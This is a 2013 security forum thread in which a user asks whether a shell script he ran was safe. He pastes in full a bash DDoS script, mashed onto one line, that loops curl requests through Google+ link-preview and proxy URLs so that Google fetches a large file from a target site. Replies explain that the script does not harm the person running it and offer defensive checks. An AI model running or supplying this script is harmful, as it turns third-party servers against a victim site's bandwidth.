---
title: "Ran a shell script I dont trust, can someone help me find out if its safe?"
date: 2013-04-14
forum: Security
---

### Post by Psil0cybin on 2013-04-14
Hey guys I was trying to test and see how well my server would cope under a DDOS attack.
I ran this shell script attempting to use google bandwidth to attack my webserver, using an 2011 exploit 

[http://iht.li/p/tdQt2t](http://iht.li/p/tdQt2t)

and this

[http://www.ihteam.net/advisory/make-requests-through-google-servers-ddos/](http://www.ihteam.net/advisory/make-requests-through-google-servers-ddos/)

explains the above script,
do you think it was safe, or avery stupid call to run? I looked over the code and it seems pretty straight forward
I was wondering if there is a command that would show me which shell scripts are run on startup? or currently running so i know its gone.
I ran rkhunter and it came out fine, but I just wanted to make sure I didnt end up getting malware or something sketchie, downloading behind my back
Thanks again in advance
-Psil0

---

### Post by tubbygweilo on 2013-04-14
Psil0cybin,
> Ran a shell script I dont trust

From what you are saying I gather you don't trust the script that you ran, I hope that you have full and verified backups of your system prior to running this script in the event that your fears are well founded? I for one am not clicking on either of the links you are offering but would suggest a rebuild of your kit from a known good source as this may be quicker that searching about for things that may or not now function as expected.

ATB

---

### Post by Psil0cybin on 2013-04-14
Here I can post it on pastebin
[http://pastebin.com/vbJ68nUg](http://pastebin.com/vbJ68nUg)

All it is is the following just for some reason it isn't being formatted like it should be, and seems like one big line. 


```
[COLOR=#000000]#!/bin/bash[/COLOR]
#   Bug found by                        ##       Simone 'R00T_ATI' Quatrini      ##       Mauro 'epicfail' Gasperini      ##       Site: [http://www.ihteam.net](http://www.ihteam.net)     #function start {    echo "
[*] Sending `echo $2` Requests..."        for a in `seq $2`    do        id=$((RANDOM%3999999+3000000))        nohup curl "https://plus.google.com/_/sharebox/linkpreview/?c=$url&t=1&_reqid=$id&rt=j" -k -A "Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0" > /dev/null 2>&1 &        nohup curl "https://images2-focus-opensocial.googleusercontent.com/gadgets/proxy?url=$urlclear&container=focus" -k -A "Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0" > /dev/null 2>&1 &    done    echo "
[*] Still attacking `echo $urlclear`"    echo "
[*] Sleeping for 10 Seconds"    sleep 10    start url $2 urlclear}echo ''echo '             88888888ba,    88888888ba,                  ad88888ba  ' echo '    aa      88      `"8b   88      `"8b                d8"     "8b  'echo '    88      88        `8b  88        `8b               Y8,          'echo 'aaaa88aaaa  88         88  88         88   ,adPPYba,   `Y8aaaaa,    'echo '""""88""""  88         88  88         88  a8"     "8a    `"""""8b,  'echo '    88      88         8P  88         8P  8b       d8          `8b  'echo '    ""      88      .a8P   88      .a8P   "8a,   ,a8"  Y8a     a8P  'echo '            88888888Y""    88888888Y""     `"YbbdP""    "Y88888P"'echo ''if [ "$#" -lt 2 ]; then    echo "Usage: $0 <big file> <Requests>"    echo "Example: $0 [http://www.site.com/very_big_file.tar.gz](http://www.site.com/very_big_file.tar.gz) 1000"    echo ""    exit 0                                                                                                                                                                          fi                                                                                                                                                                                                                                                                                                                                                                      case $2 in                                                                                                                                                                              *[!0-9]* )  echo "$2 is not numeric" && exit 1;;                                                                                                                                esac                                                                                                                                                                                                                                                                                                                                                                    echo "Attack -->" $1                                                                                                                                                                match1=/                                                                                                                                                                            repl1=%2F                                                                                                                                                                           match2=:                                                                                                                                                                            repl2=%3A                                                                                                                                                                           url=$1                                                                                                                                                                              urlclear=$1                                                                                                                                                                                                                                                                                                                                                             url=${url//$match1/$repl1}                                                                                                                                                          url=${url//$match2/$repl2}                                                                                                                                                                                                                                                                                                                                              echo ""                                                                                                                                                                             echo "
[*] Loop started! CTRL+C to stop"                                                                                                                                             echo "" [COLOR=#000000]start url $2 urlclear[/COLOR]
```

Is there maybe a command I can use to be able to see if anything is being auto started?
I didnt have an option to enter my root password, nor did I run the shell script in root...could it still cause problems..
Once again when reviewing the code, it seems perfectly fine..Just looks a little bit messy up top because the individual commented a bunch of ASCII text in order to write DDOS lol in letters.

From my observation once again the code looks harmless, just attempting to get a file through googles sites.
I just want to make sure it didnt download something in the background? Except the code LOOKS fine!
Im just being overly paranoid.
Im just more interested in learning about how I would know? Other than looking at the code if anything funky happend on my linux box.

---

### Post by tubbygweilo on 2013-04-14
Psil0cybin,
I do not have the knowledge to offer you any further help or advice but I do expect someone will be along in a short while with the ability to answer all of your questions.

---

### Post by pqwoerituytrueiwoq on 2013-04-14
after reading the script it will not harm you in anyway, however a DDOS attack is just a minor annoyance, it is pathetic people think that is hacking (it is more like a crying baby in the middle of the night)
the worst think that will happen to you is google temporally blocking you
it does require that you install [curl]("apt:curl")

only checked the pastebin url BTW

---

### Post by Psil0cybin on 2013-04-14
Thank you so much maybe you know any command that will show me which scripts are executed on startup? Also if I type lsof -I would that show me all my apps accessing the internet?

---

### Post by hakermania on 2013-04-14
It doesn't seem to be dangerous. It would be if it downloaded anything and attempted to run it. It doesn't seem to do anything like this.

---

### Post by MG&amp;TL on 2013-04-14
> **Psil0cybin said:**
> Thank you so much maybe you know any command that will show me which scripts are executed on startup?

Run:

```
initctl list
```

to see scripts started at boot, and consult your desktop environment manual for scripts that run on login.

---

### Post by Psil0cybin on 2013-04-14
> **hakermania said:**
> It doesn't seem to be dangerous. It would be if it downloaded anything and attempted to run it. It doesn't seem to do anything like this.

Perfect ! Thank u. Another quick question woudnt I need to type my root password I order for it to download something lets say and run it or can this haopen just as a regular user?

---

### Post by hakermania on 2013-04-14
> **Psil0cybin said:**
> Perfect ! Thank u. Another quick question woudnt I need to type my root password I order for it to download something lets say and run it or can this haopen just as a regular user?

It can happen as a regular user.

Almost anything that you can do from your account as you've logged in, can be done through a script, as well.

Can you delete all your files in your home folder? Yes, you can, and so does a script.

---

### Post by Psil0cybin on 2013-04-14
Oh snap so I guess a shell script is no different than a .bat on windows right?

---

### Post by SeijiSensei on 2013-04-14
Yes, it is, because the bash shell scripting language is much more powerful than MS batch commands.

If you really want to play with dangerous things, for goodness sake install [VirtualBox]("https://www.virtualbox.org/") and test them in a virtual machine.  After you create the initial VM, use the snapshot function to preserve a clean image that you can restore if you manage to screw up your running VM.  

Even then you should never run anything you think suspicious with root privileges.  As an ordinary user you can blow up your home directory and a small number of other places like /tmp, but you cannot touch the actual operating system software that is owned by root.

---

### Post by Psil0cybin on 2013-04-14
Perfect thanks so much, 
Pretty much the script I ran was straight forward to be honest the only line that makes me parranoid is this command
"[COLOR=#000000][FONT=Consolas] id=$((RANDOM%3999999+3000000))"
As when googling it, it only brings up this specific script, so it looks like that command is hardly ever ued
so I was just curious if something could be hiding within that command in the sense that its getting a file, but you guys helped ease my worries
and yes for next time I will run all scripts over a VM. I just thought that without typing in my root password nothing negative could be done. 

Im more worried about getting Malware than having my home folder deleted, but that would be pretty bad too![/FONT][/COLOR]

---

### Post by hakermania on 2013-04-14
> **SeijiSensei said:**
> Even then you should never run anything you think suspicious with root privileges.  As an ordinary user you can blow up your home directory and a small number of other places like /tmp, but you cannot touch the actual operating system software that is owned by root.

I will agree with you but I may add that running an evil script as _**simple**_ user can do the following:
[LIST=1]
[*]Download anything from the web & run it as simple user
[*]Make something run at startup
[*]Delete anything in your home directory
[/LIST]

So, prior to running any script, fully understand what it does, if it isn't from a trustful source. If you cannot understand then run it into a VM with wireshark running.

That would be safe.

---

### Post by Psil0cybin on 2013-04-14
Thank you everyone for your fast support. It looks safe to me as no problems happend but this was a learning experience that wont happen again. You guys rock. Just a fyi type thing how would I know if a shell downloaded a file or is sending out information could I use
Lsof -I 
Just to double check nothing was run...althoufh the code doea look clean...it doesnt seem to download anything just once again the random number string is strange as I canmot find out what it does exactly...maybe randomize something like a url?

---

### Post by hakermania on 2013-04-14
> **Psil0cybin said:**
> Thank you everyone for your fast support. It looks safe to me as no problems happend but this was a learning experience that wont happen again. You guys rock. Just a fyi type thing how would I know if a shell downloaded a file or is sending out information could I use
Lsof -I 
Just to double check nothing was run...althoufh the code doea look clean...it doesnt seem to download anything just once again the random number string is strange as I canmot find out what it does exactly...maybe randomize something like a url?


No, it doesn't generate any random url or anything weird like that.


The variable RANDOM returns a random integer, and thus, this is a way for him to generate a random id:
```

id=$((RANDOM%3999999+3000000))

```
for every time the loop runs (so, every time the id variable will have a different value) (Note: I guess that the %3999999+3000000 part is where he tries to randomize the id as much as he can).

He then uses this id on a command, at this part:
```

https://plus.google.com/_/sharebox/linkpreview/?c=$url&t=1&_reqid=$**id**

```

---

### Post by tubbygweilo on 2013-04-14
Keep your backups in order and run stuff in a virtual machine may well be the way to go but please do keep do us informed if something bites you in then bum as we would all like to  help you and make a note of what bit you in the bum.

---

### Post by Psil0cybin on 2013-04-14
Aha thanks again guys!! Looks like im in the clear! but it was deff a learning experience. 
I am very thankful for everyone here :):)
MUCH MUCH MUCH MUCH! MUCH appreciated. 
You guys sure calmed me down a bit, and taught me a valuable lesson.

---

### Post by hakermania on 2013-04-14
> **Psil0cybin said:**
> Aha thanks again guys!! Looks like im in the clear! but it was deff a learning experience. 
I am very thankful for everyone here :):)
MUCH MUCH MUCH MUCH! MUCH appreciated. 
You guys sure calmed me down a bit, and taught me a valuable lesson.

Please mark the thread as Solved under the thread tools on the upper right.

---

### Post by Psil0cybin on 2013-04-14
Thanks again guys! much appreciated. 
Just another quick question? Would I be able to look at a particular Log? to see what happened after I ran the script?
Just out of curiosity and educational purposes of course.

---

### Post by tubbygweilo on 2013-04-15
Psil0cybin, 
You may also wish to log the upload download speeds of you kit as you experment with this script by using the vnstat command [http://ubuntuforums.org/showthread.php?t=2134012](http://ubuntuforums.org/showthread.php?t=2134012).

---

